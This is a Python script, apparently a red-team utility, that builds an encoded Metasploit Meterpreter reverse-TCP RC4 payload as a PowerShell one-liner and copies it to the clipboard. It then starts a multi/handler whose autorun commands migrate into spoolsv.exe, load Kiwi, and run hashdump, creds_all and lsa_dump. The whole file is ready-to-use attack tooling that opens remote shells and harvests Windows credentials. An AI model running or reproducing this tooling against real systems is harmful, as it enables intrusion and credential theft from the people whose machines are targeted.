#!/usr/bin/python
# Description: Generates a MSF Reverse TCP RC4 payload encoded in Powershell to the clipboard.
# Automatically launches the corresponding MSF Multi/Handler.
# The Multi/Handler listener is weaponized to automatically migrate into the spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.
# rc4Gen.py supports both command-line parameters and a Wizard driven menu.
# Version: rc4Gen.py v 1.10122016
# Created by: Nick Sanzotta/@beamr

import getopt, os, sys, pyperclip, socket
import urllib, json
from sys import argv

filePowershell = 'rc4_payload.ps1'
fileAutoscript = 'autorun_commands.rc'
filerc4listener = 'rc4_listener.rc'

class colors:
   white = "\033[1;37m"
   normal = "\033[0;00m"
   red = "\033[1;31m"
   blue = "\033[1;34m"
   green = "\033[1;32m"

banner = colors.green + r"""
            __ __    ____                      
           /\ \\ \  /\  _`\                    
 _ __   ___\ \ \\ \ \ \ \L\_\     __    ___    
/\`'__\/'___\ \ \\ \_\ \ \L_L   /'__`\/' _ `\  
\ \ \//\ \__/\ \__ ,__\ \ \/, \/\  __//\ \/\ \ 
 \ \_\\ \____\\/_/\_\_/\ \____/\ \____\ \_\ \_\
  \/_/ \/____/   \/_/   \/___/  \/____/\/_/\/_/
"""+'\n' \
+ colors.green + '\n rc4Gen.py v1.10122016' \
+ colors.normal + '\n Description: Generates a MSF Reverse TCP RC4 payload encoded in Powershell to the clipboard.'\
+ colors.normal + '\n Created by: Nick Sanzotta/@beamr' + '\n'\
+ colors.normal + ' ' + '*' * 95 +'\n' + colors.normal


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_external_address():
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	print("External IP: "+data["ip"])
	return data["ip"]

def get_internal_address():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print("Internal IP: "+s.getsockname()[0])
	return s.getsockname()[0]

def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
	rc4 = os.system('msfvenom -p windows/meterpreter/'+msfPayload+ ' -e x86/shikata_ga_nai RC4PASSWORD='+rc4Password+' LHOST='+lhost+' LPORT='+lport+' -f psh-cmd -o ' +filePowershell)
	with open(filePowershell, 'r+') as f1:
		rc4Payload = f1.read()

	on = set(['on','yes', 'ye', ''])
	off = set(['off','of', 'no'])
	if verboseChoice in on:
		print('\nPAYLOAD: '+msfPayload)
		print('LHOST: '+lhost)
		print('LPORT: '+lport)
		print('RC4PASSWORD: '+rc4Password)
		print('\n')
		print(rc4Payload[30:])
	elif verboseChoice in off:
		pyperclip.copy(rc4Payload[30:])
		print('\nPayload Copied to Clipboard:')
		print('\nPAYLOAD: '+msfPayload)
		print('LHOST: '+lhost)
		print('LPORT: '+lport)
		print('RC4PASSWORD: '+rc4Password)
		print('\n')
	else:
		sys.stdout.write("Please respond with 'ON' or 'OFF'")

def autorunscript():
	with open(fileAutoscript, 'w') as f1:
		f1.write("migrate -N spoolsv.exe\n"+\
				 "load kiwi\n"+\
				 "sysinfo\n"+\
				 "hashdump\n"+\
				 "creds_all\n"+\
                 "lsa_dump")

def listener(msfPayload,lhost,lport,rc4Password, msflistenerChoice): 
	on = set(['on','yes', 'ye', ''])
	off = set(['off','of','no'])
	if msflistenerChoice in on:
		with open(filerc4listener, 'w') as f:
			f.write("use multi/handler"+"\n"+\
					"set PAYLOAD windows/meterpreter/"+msfPayload+"\n"+\
					"set LHOST "+lhost+"\n"+\
					"set LPORT "+lport+"\n"+\
					"set Rc4PASSWORD "+rc4Password+""+"\n"+\
					"set ExitOnSession false"+"\n"+\
					"set AutoRunScript multi_console_command -rc "+fileAutoscript+"\n"+\
					"exploit -j -z")
		os.system('msfconsole -q -r '+filerc4listener)
	elif msflistenerChoice in off:
		sys.exit(2)
	else:
		sys.stdout.write("Please respond with 'ON' or 'OFF'")

def help():
        cls()
        print banner
        print " Usage: python rc4Gen.py --lhost <OPTIONS>"
        print " Example: python rc4Gen.py --lhost 10.0.0.1 --lport=445 --pass=Password123 --verbose=on --listener=off"
        
        print colors.green + "\n Tips:\n" + colors.normal
        print " If LHOST is not defined the Wizard menu will be launched."
        print " The Multi/Handler listener is weaponized to automatically migrate into the\
                \n spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.\n"

        print "\t --lhost=<> This will define the local host used for the reverse_tcp_rc4 payload.\n"
        print "\t --lhost=<443> is default, this value will define the local port used for the reverse_tcp_rc4 payload.\n"
        print "\t --pass=<rc4M4g1c> is default, this value will define the RC4PASSWORD used for the reverse_tcp_rc4 payload.\n"

        print "\t --verbose=[OFF] is default, this will copy payload to Clipboard.\n"
        print "\t --verbose=[ON] is not default, this will print payload to STDOUT.\n"

        print "\t --listener[ON] is default, this will automatically launch the corresponding MSF Multi/Handler.\n"
        print "\t --listener[OFF] is not default, this will NOT launch MSF multi/handler."

        print colors.green + "\n Misc:\n" + colors.normal
        print "\t --help <help>\t\tPrints this help menu."
        sys.exit(2)

def main(argv):
    print(banner)
    lhost= ''
    lport = '443'
    rc4Password = 'rc4M4g1c'
    msfPayload = 'reverse_tcp_rc4'
    verboseChoice = 'off'
    msflistenerChoice = 'on'
    if not os.path.exists("/opt/rc4Gen/"):
        os.mkdir("/opt/rc4Gen/") 

    if len(argv) < 1:
    	extipAddress = get_external_address()
    	intipAddress = get_internal_address()
    	print('\n')
    	#WIZARD Menu: If no args are defined the wizard will be launched.
    	print('You did not specifiy the LHOST, wizard menu has launched:\n')

    	lhost = raw_input('Enter LHOST for payload'+'['+extipAddress+']:') or extipAddress
    	print('ENTERED: "%s"' % lhost + '\n')
    	
    	lport = raw_input('Enter LPORT for payload'+'['+lport+']:') or lport
    	print('ENTERED: "%s"' % lport + '\n')

    	rc4Password = raw_input('Enter RC4PASSWORD for payload'+'['+rc4Password+']:') or rc4Password
    	print('ENTERED: "%s"' % rc4Password + '\n')
    	
    	print('TIP: Verbosity [ON] will print payload to STDOUT.')
    	print('TIP: Verbosity [OFF] will copy payload to Clipboard.')
    	verbose = raw_input('Verbosity[OFF/on]:') or 'OFF'
    	verboseChoice = verbose.lower()
    	print('ENTERED: "%s"' % verboseChoice.upper() + '\n')
    	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)

    	print('TIP: Listener [ON] will automagically launch a MSF listener.')
    	msfListener = raw_input('listener[ON/off]:') or 'ON'
    	msflistenerChoice = msfListener.lower()
    	print('ENTERED: "%s"' % msflistenerChoice.upper() + '\n')
    	listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)

    else:
    	try:
        	opts, args = getopt.getopt(argv, 'lhost:lport:pass:verbose:listener:help',['lhost=','lport=','pass=','verbose=','listener=','help'])
            #GETOPT Menu: 
        	for opt, arg in opts:
        		if opt in ('--help'):
        			help()
        			sys.exit(2)
        		elif opt in ('--lhost'):
        			lhost = arg
        		elif opt in ('--lport'):
        			lport = arg
        		elif opt in ('--pass'):
        			rc4Password = arg
        		elif opt in ('--verbose'):
        			verboseChoice = arg
        		elif opt in ('--listener'): 
        			msflistenerChoice = arg
        		else:
        			help()
        			sys.exit(2)
        	payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
        	autorunscript()
        	listener(msfPayload,lhost,lport,rc4Password,msflistenerChoice)

    	
    	except getopt.GetoptError:
        	help()
        	sys.exit(2)
    

if __name__ == "__main__":
    main(argv[1:])
